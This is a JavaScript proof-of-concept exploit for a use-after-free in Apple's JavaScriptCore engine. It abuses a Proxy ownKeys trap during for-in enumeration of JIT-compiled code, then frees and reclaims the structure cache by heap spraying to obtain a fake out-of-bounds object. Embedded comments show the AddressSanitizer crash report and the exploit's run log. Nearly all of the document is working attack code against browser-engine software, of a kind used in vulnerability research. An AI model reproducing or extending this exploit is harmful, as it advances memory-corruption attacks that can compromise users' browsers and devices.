load('utils.js');
load('int64.js');
print('[*] Be ready, This is a Slow one!');


function set(p, i, a,b,c,d,e,f,g,h) {
    p[i+0]=a; p[i+1]=b; p[i+2]=c; p[i+3]=d; p[i+4]=e; p[i+5]=f; p[i+6]=g; p[i+7]=h;
}

var s1 = [];
var s2 = [];
// var evil_arr = [0,new Float64Array(1)];

// Collect Garbage ..
function gc() {
    for (let i = 0; i < 0x24; i++) {
        new ArrayBuffer(1024 * 1024 * 10);
    }
}

function r_str(l){
    let random_string = '';
    let random_ascii;
    for(let i = 0; i < l; i++) {
        random_ascii = Math.floor((Math.random() * 25) + 97);
        random_string += String.fromCharCode(random_ascii)
    }
    return random_string
}

// we create 3 objects.
// o2 and o3 are the same (a deep copy),
// because we want the compiler to cache this structures.
// after this, we Traverse the raw memory of the cached second structure
// to find a 'fake object' ..
var o, o2, o3;

function obj_with_o(ooo,n){
  
    let s = 'var obj = {';
    for (let y = 0; y < n; y++){
        s += 'a' + y + ':' + 'ooo' + ',';
    }
    s += '}'
    eval(s);
    return obj;
    
}

function obj_with_ua(n){

    let ua = new Uint32Array(1000);
    ua.fill(156842099844.51764);    
    let s = 'var obj = {';
    for (let y = 0; y < n; y++){
        s += 'a' + y + ':' + 'ua' + ',';
    }
    s += '}'
    eval(s);
    return obj;
    
}

// to Spray the cache..
function minimal_opt(tmp,tt) {
            
    function f(a) {
        return a;
    }
        
    let p = new Proxy(tmp,{ownKeys:f});
    tt.__proto__ = p;

    for (let x in tt) {    
    }
    
}

print('[*] allocating objects..');

// Magic numbers ..
o2 = obj_with_ua(46800)
o3 = obj_with_ua(46800)
o = obj_with_ua(6);

var s = [];

function opt(tmp,flag) {
            
    function f(a) {
        if (flag){ 
            gc();
            print('[*] after gc, we freed the cache..');
        }
        return a;
    }
        
    let p = new Proxy(tmp,{ownKeys:f});
    o2.__proto__ = p;
    
    let sign = 0;

    for (let x in o2) {
        
        if (flag) { 
        
            // we don't want to refarance this
            // object twice if its a fake_object.
            // because jsc would crash..
            // so save this into a string.
            var type;
            
            if ( sign == 0 ){
            
                type = typeof x;
                // we need to flush stdout ..
                if ( type == 'string' ){}
                else{ print('[*] looking for the oob object, found object: '+type);}
                
            } else if ( sign == 1 ) {
            
                   // this is for the second
                   // OOB object ..
                   
                   // NOTE: we are accessing the freed cache...
                   // if we recompile a function with big structucres then they would be
                   // reallocated on the cache.
                   // practically replacing the Structure of this object ..
                   
                   /*
                   
                   
                           before the replacment:
                           
                           print(x[0]);
                   
                            =================================================================
                            ==1570==ERROR: AddressSanitizer: heap-use-after-free on address 0x604002576529 at pc 0x00010224d103 bp 0x7ffeefbfcaf0 sp 0x7ffeefbfcae8
                                READ of size 1 at 0x604002576529 thread T0
                            #0 0x10224d102 in operationGetByValOptimize (JavaScriptCore:x86_64+0x2081102)
                            #1 0x5b9790a08d73  (<unknown module>)
                            #2 0x1023b39e6 in llint_entry (JavaScriptCore:x86_64+0x21e79e6)
                            #3 0x1023a45b8 in vmEntryToJavaScript (JavaScriptCore:x86_64+0x21d85b8)
                            #4 0x101f52ec7 in JSC::Interpreter::executeProgram(JSC::SourceCode const&, JSC::ExecState*, JSC::JSObject*) (JavaScriptCore:x86_64+0x1d86ec7)
                            #5 0x1029bef6b in JSC::evaluate(JSC::ExecState*, JSC::SourceCode const&, JSC::JSValue, WTF::NakedPtr<JSC::Exception>&) (JavaScriptCore:x86_64+0x27f2f6b)
                            #6 0x100012444 in jscmain(int, char**) (jsc:x86_64+0x100012444)
                            #7 0x10001048a in main (jsc:x86_64+0x10001048a)
                            #8 0x7fff793a53d4 in start (libdyld.dylib:x86_64+0x163d4)

                            0x604002576529 is located 25 bytes inside of 34-byte region [0x604002576510,0x604002576532)
                            freed by thread T0 here:
                                #0 0x1046bf11b in __sanitizer_mz_free (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x5d11b)
                                #1 0x1039f6534 in bmalloc::DebugHeap::free(void*) (JavaScriptCore:x86_64+0x382a534)
                                #2 0x1039ef2b8 in bmalloc::Cache::deallocateSlowCaseNullCache(bmalloc::HeapKind, void*) (JavaScriptCore:x86_64+0x38232b8)           <--- bmalloc::Cache:: ...
                                
                            SUMMARY: AddressSanitizer: heap-use-after-free (JavaScriptCore:x86_64+0x2081102) in operationGetByValOptimize
                            Shadow bytes around the buggy address:
                                0x1c08004aec50: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 fa
                                0x1c08004aec60: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 fa
                                0x1c08004aec70: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fa
                                0x1c08004aec80: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fa
                                0x1c08004aec90: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 00
                              =>0x1c08004aeca0: fa fa fd fd fd[fd]fd fa fa fa fd fd fd fd fd fd
                                0x1c08004aecb0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd
                                0x1c08004aecc0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd
                                0x1c08004aecd0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd
                                0x1c08004aece0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd
                                0x1c08004aecf0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd                   
                   
                   */
                   
             print('[!] found the fake OOB Object.');
                   
                   
                   /*
                   
                    after the replacment:
                   
                        lucy:bin akayn$ ./jsc poc.js
                        [*] Be ready, This is a Slow one!
                        [*] allocating objects..
                        [*] Compiling our function to trigger.
                        [*] After Compilation.
                        [*] Begin exploit.
                        [*] after gc, we freed the cache..
                        [*] looking for the oob object, found object: number
                        [*] looking for the oob object, found object: number
                        [*] looking for the oob object, found object: object
                        [!] found the fake OOB Object.
                        [*] Compiling the Second function, to Reclaim the freed Cache..
                        [*] After Compilation.
                            print(x[0])  ===  4.191714984059889e+242                   
                   */
                   
              // Setup Fast indexing type Cell header to replace the
              // in order to fake an object header with.
              // inspired by: https://github.com/phoenhex/files/blob/master/exploits/cachedcall-uaf.html , this is now turned into a similar bug..                   
              var convert = new ArrayBuffer(0x20);
              var cu = new Uint8Array(convert);
              var cf = new Float64Array(convert);
              set(cu,0,0,0,0,0,8,0,0,0);
                   
            
                // reclaim the cache ..
                // We got a race condition here,
                // FTL is trying to optimize access to curropted objects,
                // and 3/4 the times we would die on access violation,
                print('[*] Compiling the Second function, to Reclaim the freed Cache..');
                for ( let i = 0; i < 340; i++ ){
                            let rnds = r_str(8);                        
                            let t1 = obj_with_o(cu,46800/3.5);
                            let t2 = obj_with_o(cu,46800/3.5);
                            t1[rnds] = 1.2;
                            t2[rnds] = 1.2;                        
                        
                    for ( let t = 0; t < 20; t++ ){
                        minimal_opt(t1,t2);
                    }
                        s2.push([t1,t2]);                   
                }
                                              
                print('[*] After Compilation.');
                print('[*] fake_object[0] is now: '+x[0]);
                if ( typeof x[0] == 'number' ) {                         
                }
                else {
                    }
                }               
            }
                                    
            if ( type == 'object' ){                
                 sign = 1;
            } else {
                if ( type == 'string' ){}
                else if ( type == 'number' ) {                                 
                } else if ( type == 'boolean' ) {
                } else { 
                }
            }
        } else {      
        }        
    }
    
}

// Compile the function
print('[*] Compiling our function to trigger.');
for (let t = 0; t <200;t++){
    opt(o3,false);
}
print('[*] After Compilation.');
print('[*] Begin exploit.');

// trigger..    
opt(o,true);
